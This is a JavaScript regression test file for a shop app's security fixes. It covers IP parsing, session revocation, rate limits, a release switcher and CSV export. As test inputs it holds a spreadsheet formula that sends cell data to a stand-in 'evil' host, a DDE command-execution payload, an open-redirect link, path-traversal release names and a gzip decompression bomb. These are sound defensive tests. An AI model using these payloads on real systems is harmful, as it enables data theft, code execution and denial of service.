// Regression tests for the security review: each test is one finding that was fixed.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';
import { clientIp, WindowCounter } from '../../src/client-ip.js';
import { AdminAuth } from '../../src/admin/auth.js';
import { ContentStore, safeLink } from '../../src/content.js';
import { subscribersCsv } from '../../src/admin/views.js';
import { loadConfig } from '../../src/config.js';
import { createApp } from '../../src/app.js';

const temp = (name) => mkdtempSync(join(tmpdir(), `tw-sec-${name}-`));

test('behind cPanel\'s socket the visitor is the last X-Forwarded-For hop; IPv6 by /64; unknown is null', () => {
  const viaSocket = (xff) => ({ ip: undefined, socket: { remoteAddress: undefined }, headers: { 'x-forwarded-for': xff } });
  assert.equal(clientIp(viaSocket('1.2.3.4, 41.100.20.7')), '41.100.20.7');
  assert.equal(clientIp(viaSocket('2001:db8:aa:bb:1:2:3:4')), '2001:db8:aa:bb::/64');
  assert.equal(clientIp(viaSocket('not-an-ip')), null);
  assert.equal(clientIp({ ip: '::ffff:10.0.0.9', socket: { remoteAddress: '::ffff:10.0.0.9' }, headers: {} }), '10.0.0.9');
  // over TCP, a forged header is not read here (Express already decided req.ip)
  assert.equal(clientIp({ ip: '41.1.1.1', socket: { remoteAddress: '127.0.0.1' }, headers: { 'x-forwarded-for': '6.6.6.6' } }), '41.1.1.1');
});

test('flooding the counters with new addresses cannot lift a lock', () => {
  const c = new WindowCounter({ windowMs: 60_000, max: 3, maxKeys: 100 });
  for (let i = 0; i < 3; i += 1) c.hit('attacker');
  for (let i = 0; i < 99; i += 1) c.hit(`other-${i}`);
  assert.equal(c.full('attacker'), true, 'still locked with the table full');
  for (let i = 99; i < 500; i += 1) c.hit(`other-${i}`);
  assert.ok(c.hits.size <= 100, 'bounded');
});

test('dashboard: « Déconnexion » ends every session; a cookie cannot outlive 12 hours', () => {
  let generation = 0;
  let now = 1_000_000_000;
  const auth = new AdminAuth({ user: 'admin', password: 'a-long-enough-password', secret: 's'.repeat(40), now: () => now, generation: () => generation, revoke: () => { generation += 1; } });
  const cookie = auth.login('1.1.1.1', 'admin', 'a-long-enough-password').split(';')[0];
  const req = { headers: { cookie } };
  assert.equal(auth.check(req), true);
  auth.logout();
  assert.equal(auth.check(req), false, 'the stolen copy dies with the logout');
  // a cookie made « in the future » (as with a leaked secret) is refused today
  now += 100 * 3_600_000;
  const future = auth.login('1.1.1.1', 'admin', 'a-long-enough-password').split(';')[0];
  now -= 100 * 3_600_000;
  assert.equal(auth.check({ headers: { cookie: future } }), false);
});

test('slide links cannot leave the site through a backslash; CSV cells cannot run formulas', () => {
  assert.equal(safeLink('/\\evil.example/x'), '');
  assert.equal(safeLink('/c/qamis'), '/c/qamis');
  const csv = subscribersCsv([{ name: '=HYPERLINK("http://evil/?"&A1,"x")', phone: '0661223344', at: 't' }, { name: '@SUM(1)', phone: '0770112233', at: 't' }]);
  assert.match(csv, /"'=HYPERLINK/u);
  assert.match(csv, /"'@SUM/u);
  const content = new ContentStore({ dir: temp('csv') });
  const l = content.saveLaunch({ titleFr: 'L', launchAt: '2030-01-01T10:00', products: ['p'], active: 'on' }).launch;
  content.subscribe(l.id, { phone: '0661223344', name: '=cmd|"/c calc"!A1' });
  assert.equal(content.subscribers(l.id)[0].name, 'cmd|"/c calc"!A1');
});

test('without a long APP_SECRET a random one is created once and kept; the sync key is never reused', () => {
  const dataDir = temp('secret');
  const config = loadConfig({ DATA_DIR: dataDir, APP_SECRET: '', NEWSTORE_SYNC_KEY: 'k'.repeat(40), SITE_URL: 'http://127.0.0.1' });
  createApp(config);
  const kept = readFileSync(join(dataDir, '.app-secret'), 'utf8').trim();
  assert.equal(kept.length, 64);
  assert.notEqual(kept, 'k'.repeat(40));
  createApp(config);
  assert.equal(readFileSync(join(dataDir, '.app-secret'), 'utf8').trim(), kept, 'the same one after a restart');
});

// ---- over HTTP -----------------------------------------------------------------------------
async function serve(env = {}) {
  const dataDir = temp('http');
  const config = loadConfig({ DATA_DIR: dataDir, NEWSTORE_SYNC_KEY: 'sync-key-0123456789abcdef0123456789', SITE_URL: 'https://shop.example', ...env });
  const { app } = createApp(config);
  const server = await new Promise((done) => { const s = app.listen(0, '127.0.0.1', () => done(s)); });
  const base = `http://127.0.0.1:${server.address().port}`;
  return { base, close: () => new Promise((done) => { server.closeAllConnections(); server.close(done); }) };
}

test('/api/sync.php: no key, no body read — a slow multipart is answered at once; long boundaries refused', async () => {
  const { base, close } = await serve();
  try {
    const boundary = `${'-'.repeat(4000)}x`;
    const started = Date.now();
    const res = await fetch(`${base}/api/sync.php?action=ping`, { method: 'POST', headers: { 'content-type': `multipart/form-data; boundary=${boundary}` }, body: Buffer.alloc(2_000_000, '-') });
    assert.equal(res.status, 401);
    assert.ok(Date.now() - started < 1500, `answered in ${Date.now() - started} ms`);
    const keyed = await fetch(`${base}/api/sync.php?action=ping`, { method: 'POST', headers: { 'x-newstore-key': 'sync-key-0123456789abcdef0123456789', 'content-type': `multipart/form-data; boundary=${boundary}` }, body: 'x' });
    assert.equal(keyed.status, 400);
    const ping = await fetch(`${base}/api/sync.php?action=ping`, { headers: { 'x-newstore-key': 'sync-key-0123456789abcdef0123456789' } });
    assert.equal(ping.status, 200, 'the shop software still gets in');
  } finally {
    await close();
  }
});

test('shop front: tracking is rate-limited, malformed URLs are 400, /health tells no business figures, HSTS on https', async () => {
  const { base, close } = await serve();
  try {
    let last;
    for (let i = 0; i < 9; i += 1) last = await fetch(`${base}/suivi`, { method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded', 'x-forwarded-for': '9.9.9.9' }, body: `ref=WEB-1&phone=066122334${i}` });
    assert.equal(last.status, 429, 'one reference cannot be tried endlessly');
    assert.equal((await fetch(`${base}/p/%E0%A4%A`)).status, 400);
    const health = await (await fetch(`${base}/health`)).json();
    assert.equal('orders' in health || 'products' in health, false);
    const home = await fetch(`${base}/`);
    assert.match(home.headers.get('strict-transport-security') ?? '', /max-age=/u);
    assert.match(home.headers.get('content-security-policy') ?? '', /object-src 'none'/u);
  } finally {
    await close();
  }
});

// ---- the release switcher -----------------------------------------------------------------------
process.env.TW_BOOTSTRAP_LIBRARY = '1';
const require = createRequire(import.meta.url);
const bootstrapPath = require.resolve('../../deploy/bootstrap.cjs');

function fakeRoot(id, payload) {
  const root = temp('switch');
  mkdirSync(join(root, 'data'));
  writeFileSync(join(root, 'data', 'store.json'), '{"orders":[1]}');
  writeFileSync(join(root, `release-${id}.twpkg`), payload);
  writeFileSync(join(root, `release-${id}.sha256`), createHash('sha256').update(payload).digest('hex'));
  return root;
}
const runSwitcher = (root, code) => new Promise((done) => {
  const child = spawn(process.execPath, ['-e', `process.env.TW_BOOTSTRAP_LIBRARY='1';const fs=require('fs');fs.copyFileSync(${JSON.stringify(bootstrapPath)},${JSON.stringify(join(root, 'app.cjs'))});const b=require(${JSON.stringify(join(root, 'app.cjs'))});${code}`], { stdio: ['ignore', 'pipe', 'pipe'] });
  let out = '';
  child.stdout.on('data', (d) => { out += d; });
  child.stderr.on('data', (d) => { out += d; });
  child.on('exit', (status) => done({ status, out }));
});

test('switcher: « .. » and « . » are not release names (they named the app folder, data included)', async () => {
  const { MAGIC } = require(bootstrapPath);
  const pkg = gzipSync(Buffer.from(MAGIC, 'latin1'));
  for (const id of ['..', '.', 'x.partial-1', '-x']) {
    const root = fakeRoot(id, pkg);
    const r = await runSwitcher(root, `try{b.prepare(${JSON.stringify(id)});console.log('PREPARED')}catch(e){console.log('REFUSED',e.message)}`);
    assert.match(r.out, /REFUSED invalid release id/u, id);
    assert.equal(existsSync(join(root, 'data', 'store.json')), true, `data survives « ${id} »`);
  }
});

test('switcher: a decompression bomb is refused instead of exhausting memory', () => {
  const { unpack, MAGIC } = require(bootstrapPath);
  const header = Buffer.from(JSON.stringify({ p: 'big.bin', m: 0o644, s: 450 * 1024 * 1024 }));
  const length = Buffer.alloc(4);
  length.writeUInt32BE(header.length);
  const bomb = gzipSync(Buffer.concat([Buffer.from(MAGIC, 'latin1'), length, header, Buffer.alloc(450 * 1024 * 1024)]));
  assert.ok(bomb.length < 1_000_000, 'a small upload');
  assert.throws(() => unpack(bomb, temp('bomb')), /Cannot create a Buffer larger|maxOutputLength|buffer/iu);
});

test('switcher: three workers starting the same new release all get it, unpacked once', async () => {
  const { MAGIC } = require(bootstrapPath);
  const header = Buffer.from(JSON.stringify({ p: 'src/server.js', m: 0o644, s: 3 }));
  const length = Buffer.alloc(4);
  length.writeUInt32BE(header.length);
  const pkg = gzipSync(Buffer.concat([Buffer.from(MAGIC, 'latin1'), length, header, Buffer.from('ok\n')]));
  const id = '20261127-120000-race0001';
  const root = fakeRoot(id, pkg);
  const results = await Promise.all([1, 2, 3].map(() => runSwitcher(root, `try{const d=b.prepare(${JSON.stringify(id)});console.log('OK',fs.readFileSync(d+'/src/server.js','utf8').trim())}catch(e){console.log('FAIL',e.message)}`)));
  for (const r of results) assert.match(r.out, /OK ok/u, r.out);
  assert.equal(existsSync(join(root, `release-${id}.twpkg`)), false);
});
